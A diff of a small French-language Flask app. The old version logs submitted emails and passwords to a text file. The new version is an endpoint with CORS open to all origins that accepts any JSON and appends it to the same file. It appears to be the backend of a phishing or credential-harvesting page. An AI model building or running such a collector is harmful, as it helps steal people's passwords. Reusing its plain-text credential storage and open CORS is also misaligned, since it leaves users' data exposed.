@@ -1,19 +1,18 @@
-from flask import Flask, render_template, request
+from flask import Flask, request, jsonify
+from flask_cors import CORS
 
 app = Flask(__name__)
+CORS(app)
 
-@app.route('/', methods=['GET', 'POST'])
-def login():
-    if request.method == 'POST':
-        email = request.form['email']
-        password = request.form['password']
+@app.route('/enregistrer', methods=['POST'])
+def enregistrer():
+    data = request.get_json()
+    print("Données reçues :", data)
 
-        with open("data.txt", "a") as f:
-            f.write(f"Email: {email}, Mot de passe: {password}\n")
+    with open("data.txt", "a") as f:
+        f.write(str(data) + "\n")
 
-        return "Données enregistrées avec succès !"  # ← important de retourner quelque chose
-
-    return render_template('login.html')
+    return jsonify({"message": "Données enregistrées"}), 200
 
 if __name__ == '__main__':
-    app.run(debug=True)
+    app.run()
